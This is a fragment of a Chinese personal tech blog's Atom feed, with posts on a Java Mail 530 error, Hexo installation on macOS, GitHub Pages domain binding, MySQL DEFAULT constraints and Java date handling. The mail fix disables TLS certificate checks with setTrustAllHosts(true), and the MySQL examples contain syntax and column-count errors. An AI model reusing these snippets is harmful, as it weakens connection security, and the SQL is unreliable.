      <category term="技术一路走到黑" scheme="https://amosannn.github.io/categories/%E6%8A%80%E6%9C%AF%E4%B8%80%E8%B7%AF%E8%B5%B0%E5%88%B0%E9%BB%91/"/>
    
    
      <category term="java" scheme="https://amosannn.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>如何解决Java Mail下的530错误</title>
    <link href="https://amosannn.github.io/2017/07/11/java-mail-530-error/"/>
    <id>https://amosannn.github.io/2017/07/11/java-mail-530-error/</id>
    <published>2017-07-11T15:13:44.000Z</published>
    <updated>2017-07-11T15:39:35.000Z</updated>
    
    <content type="html"><![CDATA[<p>玩了一下Java Mail，试图使用QQ邮箱作为发送者的邮箱，当然填写在代码中的邮箱密码写的是明文真实密码啦。<br>喜闻乐见的是出现了error 530，这个错误的产生实际上也是腾讯对自己邮箱用户的保护机制啦。其一是谁也不希望自己的产品被克隆。其二是用户异常操作时，找不到操作记录，是不是很扎心？</p><p>于是，兜了一大圈，再回到正题上来。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javax.mail.AuthenticationFailedException: <span class="number">530</span> Error: <span class="function">A secure connection is <span class="title">requiered</span><span class="params">(such as ssl)</span>. More information at http:<span class="comment">//service.mail.qq.com/cgi-bin/help?id=28</span></span></span><br></pre></td></tr></table></figure></p><p>530报错提示需要一个安全的链接（比如ssl啦stl啦），这里就po一下ssl加密的代码吧。（其实stl也差不多的啦～<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">MailSSLSocketFactory sf = <span class="keyword">new</span> MailSSLSocketFactory();</span><br><span class="line">sf.setTrustAllHosts(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">prop.put(<span class="string">"mail.smtp.ssl.enable"</span>, <span class="string">"true"</span>);</span><br><span class="line">prop.put(<span class="string">"mail.smtp.ssl.socketFactory"</span>, sf);</span><br></pre></td></tr></table></figure></p><p>把它加进自己的代码里就阔以啦。<br>当然，邮箱里的POP3/SMTP服务与IMAP/SMTP服务就开起来吧。<br>嗯，还有，为了防止邮箱密码泄漏，腾讯给了每个用户数个登录第三方客户端的授权码，也就是可以当作密码使用的一段16位无序字母组合，那么，玩得开心。</p><blockquote><p>相关链接<br><a href="http://www.runoob.com/java/java-sending-email.html" target="_blank" rel="noopener">关于Java Mail简单粗暴的教程(菜鸟教程)</a><br><a href="http://service.mail.qq.com/cgi-bin/help?subtype=1&amp;&amp;id=28&amp;&amp;no=371" target="_blank" rel="noopener">如何使用 Foxmail 等软件收发邮件？(腾讯)</a><br><a href="http://service.mail.qq.com/cgi-bin/help?subtype=1&amp;&amp;id=28&amp;&amp;no=331" target="_blank" rel="noopener">什么是 IMAP，它又是如何设置？(腾讯)</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;玩了一下Java Mail，试图使用QQ邮箱作为发送者的邮箱，当然填写在代码中的邮箱密码写的是明文真实密码啦。&lt;br&gt;喜闻乐见的是出现了error 530，这个错误的产生实际上也是腾讯对自己邮箱用户的保护机制啦。其一是谁也不希望自己的产品被克隆。其二是用户异常操作时，找不到
      
    
    </summary>
    
      <category term="技术一路走到黑" scheme="https://amosannn.github.io/categories/%E6%8A%80%E6%9C%AF%E4%B8%80%E8%B7%AF%E8%B5%B0%E5%88%B0%E9%BB%91/"/>
    
    
      <category term="java" scheme="https://amosannn.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>mac下的hexo安装出现异常</title>
    <link href="https://amosannn.github.io/2017/06/22/hexo-installation-error-on-mac/"/>
    <id>https://amosannn.github.io/2017/06/22/hexo-installation-error-on-mac/</id>
    <published>2017-06-22T10:16:59.000Z</published>
    <updated>2017-06-22T11:18:49.000Z</updated>
    
    <content type="html"><![CDATA[<p>将hexo从win迁移到mac时发生了安装错误。</p><p>没有保留报错截图，就从日志文件中截取了关键段落。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">5751 error code ELIFECYCLE</span><br><span class="line">5752 error errno 1</span><br><span class="line">5753 error hexo-util@0.6.0 postinstall: `npm run build:highlight`</span><br><span class="line">5753 error Exit status 1</span><br><span class="line">5754 error Failed at the hexo-util@0.6.0 postinstall script.</span><br><span class="line">5754 error This is probably not a problem with npm. There is likely additional logging output above.</span><br><span class="line">5755 verbose exit [ 1, true ]</span><br></pre></td></tr></table></figure><p>按照网上的几种解法都没能完成安装</p><blockquote><p>sudo npm install -g hexo-cli</p><p>sudo npm install hexo –no-optional</p><p>sudo npm install -g hexo-cli –registry=<a href="https://registry.npm.taobao.org" target="_blank" rel="noopener">https://registry.npm.taobao.org</a></p></blockquote><p>最后尝试进入root权限中执行npm命令，即</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -s</span><br><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><p>安装成功。<br><a id="more"></a><br>若不知道如何退出root权限，可以使用以下任意一个命令。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exit</span><br><span class="line">logout</span><br><span class="line">ctrl+D</span><br></pre></td></tr></table></figure><p>启动hexo后又出现了新的报错</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&#123; Error: Cannot find module './build/Release/DTraceProviderBindings'</span><br><span class="line">    at Function.Module._resolveFilename (module.js:485:15)</span><br><span class="line">    at Function.Module._load (module.js:437:25)</span><br><span class="line">    at Module.require (module.js:513:17)</span><br><span class="line">    at require (internal/module.js:11:18)</span><br><span class="line">    at Object.&lt;anonymous&gt; (/usr/local/lib/node_modules/hexo-cli/node_modules/dtrace-provider/dtrace-provider.js:17:23)</span><br><span class="line">    at Module._compile (module.js:569:30)</span><br><span class="line">    at Object.Module._extensions..js (module.js:580:10)</span><br><span class="line">    at Module.load (module.js:503:32)</span><br><span class="line">    at tryModuleLoad (module.js:466:12)</span><br><span class="line">    at Function.Module._load (module.js:458:3)</span><br><span class="line">    at Module.require (module.js:513:17)</span><br><span class="line">    at require (internal/module.js:11:18)</span><br><span class="line">    at Object.&lt;anonymous&gt; (/usr/local/lib/node_modules/hexo-cli/node_modules/bunyan/lib/bunyan.js:79:18)</span><br><span class="line">    at Module._compile (module.js:569:30)</span><br><span class="line">    at Object.Module._extensions..js (module.js:580:10)</span><br><span class="line">    at Module.load (module.js:503:32) code: 'MODULE_NOT_FOUND' &#125;</span><br><span class="line">&#123; Error: Cannot find module './build/default/DTraceProviderBindings'</span><br><span class="line">    at Function.Module._resolveFilename (module.js:485:15)</span><br><span class="line">    at Function.Module._load (module.js:437:25)</span><br><span class="line">    at Module.require (module.js:513:17)</span><br><span class="line">    at require (internal/module.js:11:18)</span><br><span class="line">    at Object.&lt;anonymous&gt; (/usr/local/lib/node_modules/hexo-cli/node_modules/dtrace-provider/dtrace-provider.js:17:23)</span><br><span class="line">    at Module._compile (module.js:569:30)</span><br><span class="line">    at Object.Module._extensions..js (module.js:580:10)</span><br><span class="line">    at Module.load (module.js:503:32)</span><br><span class="line">    at tryModuleLoad (module.js:466:12)</span><br><span class="line">    at Function.Module._load (module.js:458:3)</span><br><span class="line">    at Module.require (module.js:513:17)</span><br><span class="line">    at require (internal/module.js:11:18)</span><br><span class="line">    at Object.&lt;anonymous&gt; (/usr/local/lib/node_modules/hexo-cli/node_modules/bunyan/lib/bunyan.js:79:18)</span><br><span class="line">    at Module._compile (module.js:569:30)</span><br><span class="line">    at Object.Module._extensions..js (module.js:580:10)</span><br><span class="line">    at Module.load (module.js:503:32) code: 'MODULE_NOT_FOUND' &#125;</span><br><span class="line">&#123; Error: Cannot find module './build/Debug/DTraceProviderBindings'</span><br><span class="line">    at Function.Module._resolveFilename (module.js:485:15)</span><br><span class="line">    at Function.Module._load (module.js:437:25)</span><br><span class="line">    at Module.require (module.js:513:17)</span><br><span class="line">    at require (internal/module.js:11:18)</span><br><span class="line">    at Object.&lt;anonymous&gt; (/usr/local/lib/node_modules/hexo-cli/node_modules/dtrace-provider/dtrace-provider.js:17:23)</span><br><span class="line">    at Module._compile (module.js:569:30)</span><br><span class="line">    at Object.Module._extensions..js (module.js:580:10)</span><br><span class="line">    at Module.load (module.js:503:32)</span><br><span class="line">    at tryModuleLoad (module.js:466:12)</span><br><span class="line">    at Function.Module._load (module.js:458:3)</span><br><span class="line">    at Module.require (module.js:513:17)</span><br><span class="line">    at require (internal/module.js:11:18)</span><br><span class="line">    at Object.&lt;anonymous&gt; (/usr/local/lib/node_modules/hexo-cli/node_modules/bunyan/lib/bunyan.js:79:18)</span><br><span class="line">    at Module._compile (module.js:569:30)</span><br><span class="line">    at Object.Module._extensions..js (module.js:580:10)</span><br><span class="line">    at Module.load (module.js:503:32) code: 'MODULE_NOT_FOUND' &#125;</span><br><span class="line">(node:3413) [DEP0061] DeprecationWarning: fs.SyncWriteStream is deprecated.</span><br></pre></td></tr></table></figure><p>虽不影响使用却看着难受，然而并没有找到能解决它的方法</p><p>╮(╯▽╰)╭</p><p>能找到的依旧是这条命令，无非是重装hexo</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo npm install hexo --no-optional</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;将hexo从win迁移到mac时发生了安装错误。&lt;/p&gt;
&lt;p&gt;没有保留报错截图，就从日志文件中截取了关键段落。&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;5751 error code ELIFECYCLE&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5752 error errno 1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5753 error hexo-util@0.6.0 postinstall: `npm run build:highlight`&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5753 error Exit status 1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5754 error Failed at the hexo-util@0.6.0 postinstall script.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5754 error This is probably not a problem with npm. There is likely additional logging output above.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5755 verbose exit [ 1, true ]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;按照网上的几种解法都没能完成安装&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;sudo npm install -g hexo-cli&lt;/p&gt;
&lt;p&gt;sudo npm install hexo –no-optional&lt;/p&gt;
&lt;p&gt;sudo npm install -g hexo-cli –registry=&lt;a href=&quot;https://registry.npm.taobao.org&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://registry.npm.taobao.org&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;最后尝试进入root权限中执行npm命令，即&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sudo -s&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;npm install -g hexo-cli&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;安装成功。&lt;br&gt;
    
    </summary>
    
      <category term="技术一路走到黑" scheme="https://amosannn.github.io/categories/%E6%8A%80%E6%9C%AF%E4%B8%80%E8%B7%AF%E8%B5%B0%E5%88%B0%E9%BB%91/"/>
    
    
      <category term="hexo" scheme="https://amosannn.github.io/tags/hexo/"/>
    
  </entry>
  
  <entry>
    <title>给GitHub Pages绑定域名 附namesilo域名优惠券</title>
    <link href="https://amosannn.github.io/2017/06/01/github-blog-binding-domain/"/>
    <id>https://amosannn.github.io/2017/06/01/github-blog-binding-domain/</id>
    <published>2017-06-01T11:51:17.000Z</published>
    <updated>2017-06-01T16:01:44.000Z</updated>
    
    <content type="html"><![CDATA[<p>在GitHub上托管Hexo博客，访问地址自然是username.github.io，如果想用自己的域名访问这个网址，怎么做呢？<br>本文从域名选购到域名绑定一条龙,给你一个更清晰的操作流程。<br><a id="more"></a></p><h1 id="域名选购"><a href="#域名选购" class="headerlink" title="域名选购"></a>域名选购</h1><p>若已有域名可直接跳到<a href="#使用DNSPod解析服务">第二步</a>。</p><p>说到域名选购，大家第一个想到的应该是狗爹(godaddy)？name？或namecheap？我使用的域名商叫<code>namesilo</code>，虽不是老牌的域名商，却也不是小年轻。并且不需要你有paypal或双币信用卡，良心地<code>支持支付宝</code>，还<code>免费赠送Whois隐私保护</code>。可能你们也听说过，没错我就是冲着赠送的whois保护去的哈哈哈~~<br>进入<a href="www.namesilo.com">namesilo官网</a>，点击右上角创建账户</p><p><img src="/images/namesilo-address-info.png" alt=""><br>值得一提的是上图红框中的信息最好填写真实地址，毕竟账号丢了或者因为其他原因登录不了，你得凭借真实信息找回账号的嘛。whois隐私保护的好处也就体现在这里，你的私人信息只有namesilo看得到。</p><p><img src="/images/namesilo-buy.png" alt=""><br>选择你想要的域名</p><p><img src="/images/namesilo-cart.png" alt=""><br>然后这个页面记得选上<code>privacy setting</code>里的whois保护</p><p>以及每个账户仅限一次的1美元优惠，填入<code>11%off</code>或者<code>1udown</code>即可以$7.99的价格拿下这个域名。</p><p>今天的汇率是 $1 : ￥6.8 你们呢2333</p><h1 id="域名绑定"><a href="#域名绑定" class="headerlink" title="域名绑定"></a>域名绑定</h1><h2 id="更改namesilo的dns指向"><a href="#更改namesilo的dns指向" class="headerlink" title="更改namesilo的dns指向"></a>更改namesilo的dns指向</h2><p>如果在域名购买时，表单中的NameServers有填入dns的话，就可以直接跳到<a href="#使用DNSPod解析服务">下一步</a>啦。</p><p><img src="/images/namesilo-dns.png" alt=""><br>如果没有的话就在右上角<code>Manage My Domains</code>中点击这个蓝色小按钮，删除其中的三条默认dns解析地址，再回来点击<code>ChangeNameservers</code>按钮。</p><p><img src="/images/namesilo-change.png" alt=""><br>将<code>NameServer 1</code>和<code>NameServer 2</code>改成</p><blockquote><p>f1g1ns1.dnspod.net<br>f1g1ns2.dnspod.net</p></blockquote><p>当然你想用默认或其他的dns解析服务也行。</p><h2 id="使用DNSPod解析服务"><a href="#使用DNSPod解析服务" class="headerlink" title="使用DNSPod解析服务"></a>使用DNSPod解析服务</h2><p>提供dns解析的商家有很多，这里只给出DNSPod的操作步骤，但是一通百通，界面不一样，操作手法还是相同的。<br><img src="/images/dnspod-setting.png" alt=""></p><p>添加三个数据</p><blockquote><p>@  A  192.30.252.153<br>@  A  192.30.252.154<br>www  CNAME  username.github.io</p></blockquote><p>注意：CNAME后的ip地址，千万不要使用ping命令得到的ip，因为GitHub Pages的页面ip不是固定ip，可能这阵子可以正常解析到你的页面，过阵子可能就解析到别人的页面去了！</p><h3 id="主机记录和记录类型说明"><a href="#主机记录和记录类型说明" class="headerlink" title="主机记录和记录类型说明"></a>主机记录和记录类型说明</h3><blockquote><p>www：解析后的域名为 www.xxxxx.com<br>@：直接解析主域名 xxxxx.com<br><em>：泛解析，匹配其他所有域名 </em>.xxxxx.com</p><p>A记录：地址记录，用来指定域名的IPv4地址（如：8.8.8.8），如果需要将域名指向一个IP地址，就需要添加A记录。<br>CNAME： 如果需要将域名指向另一个域名，再由另一个域名提供ip地址，就需要添加CNAME记录。</p></blockquote><h2 id="添加CNAME文件"><a href="#添加CNAME文件" class="headerlink" title="添加CNAME文件"></a>添加CNAME文件</h2><p>在Hexo本地目录中的source文件夹里，添加一个命名为CNAME的无后缀文件，文件中的填写你的域名.<br>如果你想让地址栏的域名显示www前缀就输入<code>www.xxxcc.com</code>，否则输入<code>xxxxx.com</code>即可。<br>例如</p><blockquote><p>www.xxxxx.com</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo c</span><br><span class="line">hexo g -d</span><br></pre></td></tr></table></figure><p>配置完后等待一会儿就可以访问啦~</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在GitHub上托管Hexo博客，访问地址自然是username.github.io，如果想用自己的域名访问这个网址，怎么做呢？&lt;br&gt;本文从域名选购到域名绑定一条龙,给你一个更清晰的操作流程。&lt;br&gt;
    
    </summary>
    
    
      <category term="GitHub" scheme="https://amosannn.github.io/tags/GitHub/"/>
    
      <category term="namesilo" scheme="https://amosannn.github.io/tags/namesilo/"/>
    
      <category term="domain" scheme="https://amosannn.github.io/tags/domain/"/>
    
      <category term="Hexo" scheme="https://amosannn.github.io/tags/Hexo/"/>
    
      <category term="DNSPod" scheme="https://amosannn.github.io/tags/DNSPod/"/>
    
  </entry>
  
  <entry>
    <title>MySQL的default约束用法</title>
    <link href="https://amosannn.github.io/2017/05/31/mysql-default-constraint/"/>
    <id>https://amosannn.github.io/2017/05/31/mysql-default-constraint/</id>
    <published>2017-05-31T14:19:51.000Z</published>
    <updated>2017-06-01T16:04:32.000Z</updated>
    
    <content type="html"><![CDATA[<p>在sql最基本的curd语句使用熟练后，我开始发现提高数据库的稳定性和易用性需要一些其他的东西，比如<code>constraint</code>(约束)。</p><p>我就一个没经过数据加密的user表演示一下<code>default约束</code>的用法。</p><h2 id="建表语句中使用"><a href="#建表语句中使用" class="headerlink" title="建表语句中使用"></a>建表语句中使用</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">user</span>(</span><br><span class="line"><span class="keyword">id</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">not</span> <span class="literal">null</span> auto_increment,</span><br><span class="line">username <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">default</span> <span class="literal">null</span>,</span><br><span class="line"><span class="keyword">status</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">default</span> <span class="string">"active"</span>;</span><br><span class="line">primary key (id)</span><br><span class="line">) engine=InnoDB default charset=utf8;</span><br></pre></td></tr></table></figure><h2 id="已有表结构？使用alter插入字段"><a href="#已有表结构？使用alter插入字段" class="headerlink" title="已有表结构？使用alter插入字段"></a>已有表结构？使用alter插入字段</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> <span class="keyword">user</span> <span class="keyword">add</span> <span class="keyword">status</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">default</span> <span class="string">"active"</span>;</span><br></pre></td></tr></table></figure><h2 id="有默认值的表如何添加数据"><a href="#有默认值的表如何添加数据" class="headerlink" title="有默认值的表如何添加数据"></a>有默认值的表如何添加数据</h2><p>那么表结构已经有了<code>default约束</code>，在插入值的时候如何处理字段的默认值呢？<br>传入null？空字符串？或者是不填？都不行！<br><a id="more"></a><br>答案是<code>传入default关键字</code>，表示插入字段预设的默认值。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">user</span> <span class="keyword">values</span>(<span class="literal">null</span>, <span class="string">"c"</span>, <span class="string">"c"</span>, <span class="keyword">default</span>);</span><br></pre></td></tr></table></figure></p><p>你想覆盖default约束传入自定义值？ 填写对应类型的值就行了。</p><hr><p>参考链接：<br><a href="https://www.w3schools.com/sql/sql_default.asp" target="_blank" rel="noopener">SQL DEFAULT Constraint</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在sql最基本的curd语句使用熟练后，我开始发现提高数据库的稳定性和易用性需要一些其他的东西，比如&lt;code&gt;constraint&lt;/code&gt;(约束)。&lt;/p&gt;
&lt;p&gt;我就一个没经过数据加密的user表演示一下&lt;code&gt;default约束&lt;/code&gt;的用法。&lt;/p&gt;
&lt;h2 id=&quot;建表语句中使用&quot;&gt;&lt;a href=&quot;#建表语句中使用&quot; class=&quot;headerlink&quot; title=&quot;建表语句中使用&quot;&gt;&lt;/a&gt;建表语句中使用&lt;/h2&gt;&lt;figure class=&quot;highlight sql&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;create&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;table&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;user&lt;/span&gt;(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;int&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;11&lt;/span&gt;) &lt;span class=&quot;keyword&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;literal&quot;&gt;null&lt;/span&gt; auto_increment,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	username &lt;span class=&quot;built_in&quot;&gt;varchar&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;255&lt;/span&gt;) &lt;span class=&quot;keyword&quot;&gt;default&lt;/span&gt; &lt;span class=&quot;literal&quot;&gt;null&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;varchar&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;255&lt;/span&gt;) &lt;span class=&quot;keyword&quot;&gt;default&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;active&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	primary key (id)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;) engine=InnoDB default charset=utf8;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;已有表结构？使用alter插入字段&quot;&gt;&lt;a href=&quot;#已有表结构？使用alter插入字段&quot; class=&quot;headerlink&quot; title=&quot;已有表结构？使用alter插入字段&quot;&gt;&lt;/a&gt;已有表结构？使用alter插入字段&lt;/h2&gt;&lt;figure class=&quot;highlight sql&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;alter&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;table&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;user&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;varchar&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;255&lt;/span&gt;) &lt;span class=&quot;keyword&quot;&gt;default&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;active&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;有默认值的表如何添加数据&quot;&gt;&lt;a href=&quot;#有默认值的表如何添加数据&quot; class=&quot;headerlink&quot; title=&quot;有默认值的表如何添加数据&quot;&gt;&lt;/a&gt;有默认值的表如何添加数据&lt;/h2&gt;&lt;p&gt;那么表结构已经有了&lt;code&gt;default约束&lt;/code&gt;，在插入值的时候如何处理字段的默认值呢？&lt;br&gt;传入null？空字符串？或者是不填？都不行！&lt;br&gt;
    
    </summary>
    
      <category term="技术一路走到黑" scheme="https://amosannn.github.io/categories/%E6%8A%80%E6%9C%AF%E4%B8%80%E8%B7%AF%E8%B5%B0%E5%88%B0%E9%BB%91/"/>
    
    
      <category term="MySQL" scheme="https://amosannn.github.io/tags/MySQL/"/>
    
      <category term="Database" scheme="https://amosannn.github.io/tags/Database/"/>
    
  </entry>
  
  <entry>
    <title>使用Calendar或DateFormat拆分日期</title>
    <link href="https://amosannn.github.io/2017/05/28/java-get-time/"/>
    <id>https://amosannn.github.io/2017/05/28/java-get-time/</id>
    <published>2017-05-28T15:18:28.000Z</published>
    <updated>2017-06-01T16:02:54.000Z</updated>
    
    <content type="html"><![CDATA[<p>今天碰到获取时间中月份和日期的需求，立马去翻jdk，发现<code>util.Date类</code>中的获取方法竟然在jdk1.1就过期了…<br>于是按着jdk中推荐的<code>Calendar类</code>摸过去，找到方法。但是不知道为什么Date里的get方法不推荐了，找机会一定要瞅一瞅源码(ง๑ •̀_•́)ง</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> 使用Calendar实现时间拆解</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">public void getTimeByCalendar()&#123;</span></span><br><span class="line"><span class="comment">Calendar cal = Calendar.getInstance();</span></span><br><span class="line"><span class="comment">cal.setTime(new Date());//  传入Date对象即可</span></span><br><span class="line"><span class="comment">int year = cal.get(Calendar.YEAR);// 获取年份</span></span><br><span class="line"><span class="comment">int month=cal.get(Calendar.MONTH);// 获取月份</span></span><br><span class="line"><span class="comment">int day=cal.get(Calendar.DATE);// 获取日</span></span><br><span class="line"><span class="comment">int hour=cal.get(Calendar.HOUR);// 小时</span></span><br><span class="line"><span class="comment">int minute=cal.get(Calendar.MINUTE);// 分           </span></span><br><span class="line"><span class="comment">int second=cal.get(Calendar.SECOND);// 秒</span></span><br><span class="line"><span class="comment">int dayOfWeek = cal.get(Calendar.DAY_OF_WEEK);// 